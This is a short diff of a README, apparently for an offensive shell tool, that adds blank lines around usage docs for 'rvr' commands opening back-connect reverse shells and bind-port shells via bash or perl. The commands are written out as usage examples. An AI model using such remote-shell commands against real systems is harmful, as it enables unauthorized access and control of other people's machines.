@@ -52,7 +52,9 @@ usage: idxconfig
 ~~~
  - ***Reverse Shell***
 ***[Back Connect]***
+
 usage: rvr bc [IP] [PORT] [TYPE]
+
 example:
 ~~~
 rvr bc 127.0.0.1 1337 bash
@@ -60,7 +62,9 @@ rvr bc 127.0.0.1 1337 perl
 ~~~
 
 ***Bind Port***
+
 usage: rvr bp [PORT] [TYPE]
+
 example:
 ~~~
 rvr bp 1337 perl
